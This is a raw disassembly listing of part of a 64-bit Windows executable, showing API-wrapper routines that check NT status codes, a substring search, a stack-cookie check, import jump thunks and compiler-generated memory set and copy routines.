   140006cac:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140006cb0:	89 7d 28             	mov    %edi,0x28(%rbp)
   140006cb3:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   140006cb7:	49 8b f0             	mov    %r8,%rsi
   140006cba:	ff 15 80 16 00 00    	call   *0x1680(%rip)        # 0x140008340
   140006cc0:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140006cc4:	48 8b cb             	mov    %rbx,%rcx
   140006cc7:	e8 68 ff ff ff       	call   0x140006c34
   140006ccc:	85 c0                	test   %eax,%eax
   140006cce:	0f 88 94 00 00 00    	js     0x140006d68
   140006cd4:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140006cd8:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140006cdc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006ce1:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   140006ce5:	45 33 c9             	xor    %r9d,%r9d
   140006ce8:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140006cec:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140006cf0:	ff 15 92 15 00 00    	call   *0x1592(%rip)        # 0x140008288
   140006cf6:	3d 34 00 00 c0       	cmp    $0xc0000034,%eax
   140006cfb:	74 5a                	je     0x140006d57
   140006cfd:	39 7d 28             	cmp    %edi,0x28(%rbp)
   140006d00:	74 55                	je     0x140006d57
   140006d02:	8b 55 28             	mov    0x28(%rbp),%edx
   140006d05:	8d 4f 01             	lea    0x1(%rdi),%ecx
   140006d08:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140006d0e:	ff 15 fc 15 00 00    	call   *0x15fc(%rip)        # 0x140008310
   140006d14:	48 8b d8             	mov    %rax,%rbx
   140006d17:	48 85 c0             	test   %rax,%rax
   140006d1a:	74 3b                	je     0x140006d57
   140006d1c:	48 8b c8             	mov    %rax,%rcx
   140006d1f:	ff 15 a3 14 00 00    	call   *0x14a3(%rip)        # 0x1400081c8
   140006d25:	84 c0                	test   %al,%al
   140006d27:	74 2e                	je     0x140006d57
   140006d29:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140006d2d:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140006d31:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006d36:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   140006d3a:	8b 45 28             	mov    0x28(%rbp),%eax
   140006d3d:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140006d41:	4c 8b cb             	mov    %rbx,%r9
   140006d44:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140006d48:	ff 15 3a 15 00 00    	call   *0x153a(%rip)        # 0x140008288
   140006d4e:	85 c0                	test   %eax,%eax
   140006d50:	78 05                	js     0x140006d57
   140006d52:	48 89 1e             	mov    %rbx,(%rsi)
   140006d55:	eb 05                	jmp    0x140006d5c
   140006d57:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140006d5c:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140006d60:	ff 15 e2 13 00 00    	call   *0x13e2(%rip)        # 0x140008148
   140006d66:	8b c7                	mov    %edi,%eax
   140006d68:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006d6d:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140006d72:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140006d77:	48 83 c4 50          	add    $0x50,%rsp
   140006d7b:	5d                   	pop    %rbp
   140006d7c:	c3                   	ret
   140006d7d:	cc                   	int3
   140006d7e:	cc                   	int3
   140006d7f:	cc                   	int3
   140006d80:	45 33 c0             	xor    %r8d,%r8d
   140006d83:	33 d2                	xor    %edx,%edx
   140006d85:	48 ff 25 8c 15 00 00 	rex.W jmp *0x158c(%rip)        # 0x140008318
   140006d8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006d96:	57                   	push   %rdi
   140006d97:	48 83 ec 50          	sub    $0x50,%rsp
   140006d9b:	48 8b d9             	mov    %rcx,%rbx
   140006d9e:	49 8b f9             	mov    %r9,%rdi
   140006da1:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140006da6:	41 8b f0             	mov    %r8d,%esi
   140006da9:	ff 15 91 15 00 00    	call   *0x1591(%rip)        # 0x140008340
   140006daf:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006db4:	48 8b cb             	mov    %rbx,%rcx
   140006db7:	e8 c8 fa ff ff       	call   0x140006884
   140006dbc:	85 c0                	test   %eax,%eax
   140006dbe:	78 42                	js     0x140006e02
   140006dc0:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140006dc7:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140006dcc:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006dd1:	44 8b ce             	mov    %esi,%r9d
   140006dd4:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140006dd8:	45 33 c0             	xor    %r8d,%r8d
   140006ddb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006de0:	ff 15 aa 14 00 00    	call   *0x14aa(%rip)        # 0x140008290
   140006de6:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006deb:	8b d8                	mov    %eax,%ebx
   140006ded:	ff 15 8d 14 00 00    	call   *0x148d(%rip)        # 0x140008280
   140006df3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006df8:	ff 15 4a 13 00 00    	call   *0x134a(%rip)        # 0x140008148
   140006dfe:	8b c3                	mov    %ebx,%eax
   140006e00:	eb 03                	jmp    0x140006e05
   140006e02:	83 c8 ff             	or     $0xffffffff,%eax
   140006e05:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006e0a:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140006e0f:	48 83 c4 50          	add    $0x50,%rsp
   140006e13:	5f                   	pop    %rdi
   140006e14:	c3                   	ret
   140006e15:	cc                   	int3
   140006e16:	cc                   	int3
   140006e17:	cc                   	int3
   140006e18:	48 8b c4             	mov    %rsp,%rax
   140006e1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006e1f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006e23:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006e27:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006e2b:	45 33 c9             	xor    %r9d,%r9d
   140006e2e:	49 63 d8             	movslq %r8d,%rbx
   140006e31:	4c 8b d2             	mov    %rdx,%r10
   140006e34:	48 85 c9             	test   %rcx,%rcx
   140006e37:	74 64                	je     0x140006e9d
   140006e39:	48 85 d2             	test   %rdx,%rdx
   140006e3c:	74 5f                	je     0x140006e9d
   140006e3e:	45 85 c0             	test   %r8d,%r8d
   140006e41:	7e 5a                	jle    0x140006e9d
   140006e43:	44 38 09             	cmp    %r9b,(%rcx)
   140006e46:	74 55                	je     0x140006e9d
   140006e48:	48 8b d1             	mov    %rcx,%rdx
   140006e4b:	48 8b c2             	mov    %rdx,%rax
   140006e4e:	48 2b c1             	sub    %rcx,%rax
   140006e51:	48 3b c3             	cmp    %rbx,%rax
   140006e54:	7d 47                	jge    0x140006e9d
   140006e56:	41 8a 02             	mov    (%r10),%al
   140006e59:	38 02                	cmp    %al,(%rdx)
   140006e5b:	75 35                	jne    0x140006e92
   140006e5d:	45 33 db             	xor    %r11d,%r11d
   140006e60:	84 c0                	test   %al,%al
   140006e62:	74 27                	je     0x140006e8b
   140006e64:	48 8b f2             	mov    %rdx,%rsi
   140006e67:	4d 8b c2             	mov    %r10,%r8
   140006e6a:	49 2b f2             	sub    %r10,%rsi
   140006e6d:	41 8b f9             	mov    %r9d,%edi
   140006e70:	3b fb                	cmp    %ebx,%edi
   140006e72:	7d 17                	jge    0x140006e8b
   140006e74:	42 8a 04 06          	mov    (%rsi,%r8,1),%al
   140006e78:	41 38 00             	cmp    %al,(%r8)
   140006e7b:	75 0e                	jne    0x140006e8b
   140006e7d:	49 ff c0             	inc    %r8
   140006e80:	ff c7                	inc    %edi
   140006e82:	49 ff c3             	inc    %r11
   140006e85:	41 80 38 00          	cmpb   $0x0,(%r8)
   140006e89:	75 e5                	jne    0x140006e70
   140006e8b:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   140006e90:	74 22                	je     0x140006eb4
   140006e92:	48 ff c2             	inc    %rdx
   140006e95:	41 ff c1             	inc    %r9d
   140006e98:	80 3a 00             	cmpb   $0x0,(%rdx)
   140006e9b:	75 ae                	jne    0x140006e4b
   140006e9d:	33 c0                	xor    %eax,%eax
   140006e9f:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140006ea4:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
   140006ea9:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140006eae:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140006eb3:	c3                   	ret
   140006eb4:	49 63 c1             	movslq %r9d,%rax
   140006eb7:	48 03 c1             	add    %rcx,%rax
   140006eba:	eb e3                	jmp    0x140006e9f
   140006ebc:	48 83 ec 38          	sub    $0x38,%rsp
   140006ec0:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006ec6:	45 33 c9             	xor    %r9d,%r9d
   140006ec9:	45 33 c0             	xor    %r8d,%r8d
   140006ecc:	33 d2                	xor    %edx,%edx
   140006ece:	ff 15 14 12 00 00    	call   *0x1214(%rip)        # 0x1400080e8
   140006ed4:	48 83 c4 38          	add    $0x38,%rsp
   140006ed8:	c3                   	ret
   140006ed9:	ff 25 f1 11 00 00    	jmp    *0x11f1(%rip)        # 0x1400080d0
   140006edf:	ff 25 db 11 00 00    	jmp    *0x11db(%rip)        # 0x1400080c0
   140006ee5:	ff 25 cd 11 00 00    	jmp    *0x11cd(%rip)        # 0x1400080b8
   140006eeb:	ff 25 bf 11 00 00    	jmp    *0x11bf(%rip)        # 0x1400080b0
   140006ef1:	ff 25 b1 11 00 00    	jmp    *0x11b1(%rip)        # 0x1400080a8
   140006ef7:	ff 25 a3 11 00 00    	jmp    *0x11a3(%rip)        # 0x1400080a0
   140006efd:	ff 25 95 11 00 00    	jmp    *0x1195(%rip)        # 0x140008098
   140006f03:	ff 25 87 11 00 00    	jmp    *0x1187(%rip)        # 0x140008090
   140006f09:	ff 25 79 11 00 00    	jmp    *0x1179(%rip)        # 0x140008088
   140006f0f:	ff 25 53 11 00 00    	jmp    *0x1153(%rip)        # 0x140008068
   140006f15:	ff 25 35 11 00 00    	jmp    *0x1135(%rip)        # 0x140008050
   140006f1b:	ff 25 37 11 00 00    	jmp    *0x1137(%rip)        # 0x140008058
   140006f21:	ff 25 39 11 00 00    	jmp    *0x1139(%rip)        # 0x140008060
   140006f27:	ff 25 9b 11 00 00    	jmp    *0x119b(%rip)        # 0x1400080c8
   140006f2d:	ff 25 3d 11 00 00    	jmp    *0x113d(%rip)        # 0x140008070
   140006f33:	ff 25 3f 11 00 00    	jmp    *0x113f(%rip)        # 0x140008078
   140006f39:	ff 25 41 11 00 00    	jmp    *0x1141(%rip)        # 0x140008080
   140006f3f:	cc                   	int3
   140006f40:	48 83 ec 28          	sub    $0x28,%rsp
   140006f44:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140006f48:	48 8b ca             	mov    %rdx,%rcx
   140006f4b:	49 8b d1             	mov    %r9,%rdx
   140006f4e:	e8 0d 00 00 00       	call   0x140006f60
   140006f53:	b8 01 00 00 00       	mov    $0x1,%eax
   140006f58:	48 83 c4 28          	add    $0x28,%rsp
   140006f5c:	c3                   	ret
   140006f5d:	cc                   	int3
   140006f5e:	cc                   	int3
   140006f5f:	cc                   	int3
   140006f60:	48 83 ec 28          	sub    $0x28,%rsp
   140006f64:	41 8b 00             	mov    (%r8),%eax
   140006f67:	4c 8b c9             	mov    %rcx,%r9
   140006f6a:	44 8b d8             	mov    %eax,%r11d
   140006f6d:	4c 8b d1             	mov    %rcx,%r10
   140006f70:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140006f74:	a8 04                	test   $0x4,%al
   140006f76:	74 13                	je     0x140006f8b
   140006f78:	41 8b 40 08          	mov    0x8(%r8),%eax
   140006f7c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140006f80:	f7 d8                	neg    %eax
   140006f82:	4c 03 d1             	add    %rcx,%r10
   140006f85:	48 63 c8             	movslq %eax,%rcx
   140006f88:	4c 23 d1             	and    %rcx,%r10
   140006f8b:	49 63 c3             	movslq %r11d,%rax
   140006f8e:	4e 8b 04 10          	mov    (%rax,%r10,1),%r8
   140006f92:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140006f96:	8b 48 08             	mov    0x8(%rax),%ecx
   140006f99:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140006f9d:	0f b6 54 01 03       	movzbl 0x3(%rcx,%rax,1),%edx
   140006fa2:	f6 c2 0f             	test   $0xf,%dl
   140006fa5:	74 08                	je     0x140006faf
   140006fa7:	8b c2                	mov    %edx,%eax
   140006fa9:	83 e0 f0             	and    $0xfffffff0,%eax
   140006fac:	4c 03 c8             	add    %rax,%r9
   140006faf:	4d 33 c8             	xor    %r8,%r9
   140006fb2:	49 8b c9             	mov    %r9,%rcx
   140006fb5:	e8 76 00 00 00       	call   0x140007030
   140006fba:	48 83 c4 28          	add    $0x28,%rsp
   140006fbe:	c3                   	ret
   140006fbf:	cc                   	int3
   140006fc0:	c2 00 00             	ret    $0x0
   140006fc3:	cc                   	int3
   140006fc4:	ff 25 8e 11 00 00    	jmp    *0x118e(%rip)        # 0x140008158
   140006fca:	ff 25 90 11 00 00    	jmp    *0x1190(%rip)        # 0x140008160
   140006fd0:	ff 25 92 11 00 00    	jmp    *0x1192(%rip)        # 0x140008168
   140006fd6:	ff 25 94 11 00 00    	jmp    *0x1194(%rip)        # 0x140008170
   140006fdc:	ff 25 c6 11 00 00    	jmp    *0x11c6(%rip)        # 0x1400081a8
   140006fe2:	ff 25 f0 11 00 00    	jmp    *0x11f0(%rip)        # 0x1400081d8
   140006fe8:	ff 25 f2 11 00 00    	jmp    *0x11f2(%rip)        # 0x1400081e0
   140006fee:	ff 25 2c 12 00 00    	jmp    *0x122c(%rip)        # 0x140008220
   140006ff4:	ff 25 2e 12 00 00    	jmp    *0x122e(%rip)        # 0x140008228
   140006ffa:	ff 25 30 12 00 00    	jmp    *0x1230(%rip)        # 0x140008230
   140007000:	ff 25 12 10 00 00    	jmp    *0x1012(%rip)        # 0x140008018
   140007006:	ff 25 f4 0f 00 00    	jmp    *0xff4(%rip)        # 0x140008000
   14000700c:	ff 25 f6 0f 00 00    	jmp    *0xff6(%rip)        # 0x140008008
   140007012:	ff 25 f8 0f 00 00    	jmp    *0xff8(%rip)        # 0x140008010
   140007018:	cc                   	int3
   140007019:	cc                   	int3
   14000701a:	cc                   	int3
   14000701b:	cc                   	int3
   14000701c:	cc                   	int3
   14000701d:	cc                   	int3
   14000701e:	cc                   	int3
   14000701f:	cc                   	int3
   140007020:	cc                   	int3
   140007021:	cc                   	int3
   140007022:	cc                   	int3
   140007023:	cc                   	int3
   140007024:	cc                   	int3
   140007025:	cc                   	int3
   140007026:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000702d:	00 00 00 
   140007030:	48 3b 0d a9 30 00 00 	cmp    0x30a9(%rip),%rcx        # 0x14000a0e0
   140007037:	75 10                	jne    0x140007049
   140007039:	48 c1 c1 10          	rol    $0x10,%rcx
   14000703d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140007042:	75 01                	jne    0x140007045
   140007044:	c3                   	ret
   140007045:	48 c1 c9 10          	ror    $0x10,%rcx
   140007049:	e9 02 00 00 00       	jmp    0x140007050
   14000704e:	cc                   	int3
   14000704f:	cc                   	int3
   140007050:	48 83 ec 38          	sub    $0x38,%rsp
   140007054:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000705a:	48 8b d1             	mov    %rcx,%rdx
   14000705d:	4c 8b 0d 84 30 00 00 	mov    0x3084(%rip),%r9        # 0x14000a0e8
   140007064:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   140007069:	4c 8b 05 70 30 00 00 	mov    0x3070(%rip),%r8        # 0x14000a0e0
   140007070:	48 ff 15 b1 12 00 00 	rex.W call *0x12b1(%rip)        # 0x140008328
   140007077:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000707c:	cc                   	int3
   14000707d:	cc                   	int3
   14000707e:	cc                   	int3
   14000707f:	cc                   	int3
   140007080:	48 83 ec 28          	sub    $0x28,%rsp
   140007084:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007089:	e8 02 00 00 00       	call   0x140007090
   14000708e:	cc                   	int3
   14000708f:	cc                   	int3
   140007090:	48 83 ec 38          	sub    $0x38,%rsp
   140007094:	4c 8b 0d 4d 30 00 00 	mov    0x304d(%rip),%r9        # 0x14000a0e8
   14000709b:	4c 8b 05 3e 30 00 00 	mov    0x303e(%rip),%r8        # 0x14000a0e0
   1400070a2:	8b d1                	mov    %ecx,%edx
   1400070a4:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   1400070a9:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   1400070b0:	00 00 
   1400070b2:	48 ff 15 6f 12 00 00 	rex.W call *0x126f(%rip)        # 0x140008328
   1400070b9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400070be:	cc                   	int3
   1400070bf:	cc                   	int3
   1400070c0:	ff 25 7a 0f 00 00    	jmp    *0xf7a(%rip)        # 0x140008040
   1400070c6:	cc                   	int3
   1400070c7:	cc                   	int3
   1400070c8:	cc                   	int3
   1400070c9:	cc                   	int3
   1400070ca:	cc                   	int3
   1400070cb:	cc                   	int3
   1400070cc:	cc                   	int3
   1400070cd:	cc                   	int3
   1400070ce:	cc                   	int3
   1400070cf:	cc                   	int3
   1400070d0:	ff 25 52 0f 00 00    	jmp    *0xf52(%rip)        # 0x140008028
   1400070d6:	cc                   	int3
   1400070d7:	cc                   	int3
   1400070d8:	cc                   	int3
   1400070d9:	cc                   	int3
   1400070da:	cc                   	int3
   1400070db:	cc                   	int3
   1400070dc:	cc                   	int3
   1400070dd:	cc                   	int3
   1400070de:	cc                   	int3
   1400070df:	cc                   	int3
   1400070e0:	ff 25 4a 0f 00 00    	jmp    *0xf4a(%rip)        # 0x140008030
   1400070e6:	cc                   	int3
   1400070e7:	cc                   	int3
   1400070e8:	cc                   	int3
   1400070e9:	cc                   	int3
   1400070ea:	cc                   	int3
   1400070eb:	cc                   	int3
   1400070ec:	cc                   	int3
   1400070ed:	cc                   	int3
   1400070ee:	cc                   	int3
   1400070ef:	cc                   	int3
   1400070f0:	ff 25 42 0f 00 00    	jmp    *0xf42(%rip)        # 0x140008038
   1400070f6:	cc                   	int3
   1400070f7:	cc                   	int3
   1400070f8:	cc                   	int3
   1400070f9:	cc                   	int3
   1400070fa:	cc                   	int3
   1400070fb:	cc                   	int3
   1400070fc:	cc                   	int3
   1400070fd:	cc                   	int3
   1400070fe:	cc                   	int3
   1400070ff:	cc                   	int3
   140007100:	cc                   	int3
   140007101:	cc                   	int3
   140007102:	cc                   	int3
   140007103:	cc                   	int3
   140007104:	cc                   	int3
   140007105:	cc                   	int3
   140007106:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000710d:	00 00 00 
   140007110:	ff e0                	jmp    *%rax
   140007112:	cc                   	int3
   140007113:	cc                   	int3
   140007114:	cc                   	int3
   140007115:	cc                   	int3
   140007116:	cc                   	int3
   140007117:	cc                   	int3
   140007118:	cc                   	int3
   140007119:	cc                   	int3
   14000711a:	cc                   	int3
   14000711b:	cc                   	int3
   14000711c:	cc                   	int3
   14000711d:	cc                   	int3
   14000711e:	cc                   	int3
   14000711f:	cc                   	int3
   140007120:	cc                   	int3
   140007121:	cc                   	int3
   140007122:	cc                   	int3
   140007123:	cc                   	int3
   140007124:	cc                   	int3
   140007125:	cc                   	int3
   140007126:	cc                   	int3
   140007127:	cc                   	int3
   140007128:	cc                   	int3
   140007129:	cc                   	int3
   14000712a:	cc                   	int3
   14000712b:	cc                   	int3
   14000712c:	cc                   	int3
   14000712d:	cc                   	int3
   14000712e:	cc                   	int3
   14000712f:	cc                   	int3
   140007130:	cc                   	int3
   140007131:	cc                   	int3
   140007132:	cc                   	int3
   140007133:	cc                   	int3
   140007134:	cc                   	int3
   140007135:	cc                   	int3
   140007136:	cc                   	int3
   140007137:	cc                   	int3
   140007138:	cc                   	int3
   140007139:	cc                   	int3
   14000713a:	cc                   	int3
   14000713b:	cc                   	int3
   14000713c:	cc                   	int3
   14000713d:	cc                   	int3
   14000713e:	cc                   	int3
   14000713f:	cc                   	int3
   140007140:	48 8b c1             	mov    %rcx,%rax
   140007143:	49 83 f8 08          	cmp    $0x8,%r8
   140007147:	72 47                	jb     0x140007190
   140007149:	0f b6 d2             	movzbl %dl,%edx
   14000714c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140007153:	01 01 01 
   140007156:	49 0f af d1          	imul   %r9,%rdx
   14000715a:	49 83 f8 4f          	cmp    $0x4f,%r8
   14000715e:	73 50                	jae    0x1400071b0
   140007160:	4d 8b c8             	mov    %r8,%r9
   140007163:	49 83 e1 f8          	and    $0xfffffffffffffff8,%r9
   140007167:	49 03 c9             	add    %r9,%rcx
   14000716a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007170:	4a 89 54 08 f8       	mov    %rdx,-0x8(%rax,%r9,1)
   140007175:	49 83 e9 08          	sub    $0x8,%r9
   140007179:	75 f5                	jne    0x140007170
   14000717b:	49 83 e0 07          	and    $0x7,%r8
   14000717f:	74 05                	je     0x140007186
   140007181:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   140007186:	c3                   	ret
   140007187:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000718e:	00 00 
   140007190:	49 83 e0 07          	and    $0x7,%r8
   140007194:	74 0a                	je     0x1400071a0
   140007196:	42 88 54 00 ff       	mov    %dl,-0x1(%rax,%r8,1)
   14000719b:	49 ff c8             	dec    %r8
   14000719e:	75 f6                	jne    0x140007196
   1400071a0:	c3                   	ret
   1400071a1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400071a8:	0f 1f 84 00 00 00 00 
   1400071af:	00 
   1400071b0:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   1400071b5:	0f 16 c0             	movlhps %xmm0,%xmm0
   1400071b8:	0f 11 01             	movups %xmm0,(%rcx)
   1400071bb:	4c 03 c1             	add    %rcx,%r8
   1400071be:	48 83 c1 10          	add    $0x10,%rcx
   1400071c2:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400071c6:	4c 2b c1             	sub    %rcx,%r8
   1400071c9:	4d 8b c8             	mov    %r8,%r9
   1400071cc:	49 c1 e9 07          	shr    $0x7,%r9
   1400071d0:	74 2f                	je     0x140007201
   1400071d2:	0f 29 01             	movaps %xmm0,(%rcx)
   1400071d5:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400071d9:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400071e0:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   1400071e4:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   1400071e8:	49 ff c9             	dec    %r9
   1400071eb:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   1400071ef:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   1400071f3:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   1400071f7:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400071fb:	75 d5                	jne    0x1400071d2
   1400071fd:	49 83 e0 7f          	and    $0x7f,%r8
   140007201:	4d 8b c8             	mov    %r8,%r9
   140007204:	49 c1 e9 04          	shr    $0x4,%r9
   140007208:	74 12                	je     0x14000721c
   14000720a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007210:	0f 11 01             	movups %xmm0,(%rcx)
   140007213:	48 83 c1 10          	add    $0x10,%rcx
   140007217:	49 ff c9             	dec    %r9
   14000721a:	75 f4                	jne    0x140007210
   14000721c:	49 83 e0 0f          	and    $0xf,%r8
   140007220:	74 06                	je     0x140007228
   140007222:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   140007228:	c3                   	ret
   140007229:	cc                   	int3
   14000722a:	cc                   	int3
   14000722b:	cc                   	int3
   14000722c:	cc                   	int3
   14000722d:	cc                   	int3
   14000722e:	cc                   	int3
   14000722f:	cc                   	int3
   140007230:	cc                   	int3
   140007231:	cc                   	int3
   140007232:	cc                   	int3
   140007233:	cc                   	int3
   140007234:	cc                   	int3
   140007235:	cc                   	int3
   140007236:	cc                   	int3
   140007237:	cc                   	int3
   140007238:	cc                   	int3
   140007239:	cc                   	int3
   14000723a:	cc                   	int3
   14000723b:	cc                   	int3
   14000723c:	cc                   	int3
   14000723d:	cc                   	int3
   14000723e:	cc                   	int3
   14000723f:	cc                   	int3
   140007240:	48 8b c1             	mov    %rcx,%rax
   140007243:	49 83 f8 08          	cmp    $0x8,%r8
   140007247:	72 37                	jb     0x140007280
   140007249:	49 83 f8 10          	cmp    $0x10,%r8
   14000724d:	77 11                	ja     0x140007260
   14000724f:	4c 8b 1a             	mov    (%rdx),%r11
   140007252:	4a 8b 54 02 f8       	mov    -0x8(%rdx,%r8,1),%rdx
   140007257:	4c 89 19             	mov    %r11,(%rcx)
   14000725a:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   14000725f:	c3                   	ret
   140007260:	49 83 f8 20          	cmp    $0x20,%r8
   140007264:	77 5a                	ja     0x1400072c0
   140007266:	0f 10 02             	movups (%rdx),%xmm0
   140007269:	42 0f 10 4c 02 f0    	movups -0x10(%rdx,%r8,1),%xmm1
   14000726f:	0f 11 01             	movups %xmm0,(%rcx)
   140007272:	42 0f 11 4c 01 f0    	movups %xmm1,-0x10(%rcx,%r8,1)
   140007278:	c3                   	ret
   140007279:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007280:	4d 85 c0             	test   %r8,%r8
   140007283:	74 15                	je     0x14000729a
   140007285:	48 2b d1             	sub    %rcx,%rdx
   140007288:	72 16                	jb     0x1400072a0
   14000728a:	44 8a 1c 11          	mov    (%rcx,%rdx,1),%r11b
   14000728e:	48 ff c1             	inc    %rcx
   140007291:	49 ff c8             	dec    %r8
   140007294:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140007298:	75 f0                	jne    0x14000728a
   14000729a:	c3                   	ret
   14000729b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400072a0:	49 03 c8             	add    %r8,%rcx
   1400072a3:	44 8a 5c 11 ff       	mov    -0x1(%rcx,%rdx,1),%r11b
   1400072a8:	48 ff c9             	dec    %rcx
   1400072ab:	49 ff c8             	dec    %r8
   1400072ae:	44 88 19             	mov    %r11b,(%rcx)
   1400072b1:	75 f0                	jne    0x1400072a3
   1400072b3:	c3                   	ret
   1400072b4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400072bb:	00 00 00 00 00 
   1400072c0:	4e 8d 1c 02          	lea    (%rdx,%r8,1),%r11
   1400072c4:	48 2b d1             	sub    %rcx,%rdx
   1400072c7:	73 09                	jae    0x1400072d2
   1400072c9:	4c 3b d9             	cmp    %rcx,%r11
   1400072cc:	0f 87 6e 01 00 00    	ja     0x140007440
   1400072d2:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   1400072d6:	48 83 c1 10          	add    $0x10,%rcx
   1400072da:	f6 c1 0f             	test   $0xf,%cl
   1400072dd:	74 12                	je     0x1400072f1
   1400072df:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400072e3:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400072e7:	0f 11 00             	movups %xmm0,(%rax)
   1400072ea:	0f 28 c1             	movaps %xmm1,%xmm0
   1400072ed:	48 83 c1 10          	add    $0x10,%rcx
   1400072f1:	4c 03 c0             	add    %rax,%r8
   1400072f4:	4c 2b c1             	sub    %rcx,%r8
   1400072f7:	4d 8b c8             	mov    %r8,%r9
   1400072fa:	49 c1 e9 06          	shr    $0x6,%r9
   1400072fe:	74 6f                	je     0x14000736f
   140007300:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
   140007307:	0f 87 b3 00 00 00    	ja     0x1400073c0
   14000730d:	49 83 e0 3f          	and    $0x3f,%r8
   140007311:	eb 2d                	jmp    0x140007340
   140007313:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000731a:	0f 1f 84 00 00 00 00 
   140007321:	00 
   140007322:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007329:	0f 1f 84 00 00 00 00 
   140007330:	00 
   140007331:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007338:	0f 1f 84 00 00 00 00 
   14000733f:	00 
   140007340:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140007344:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   140007349:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
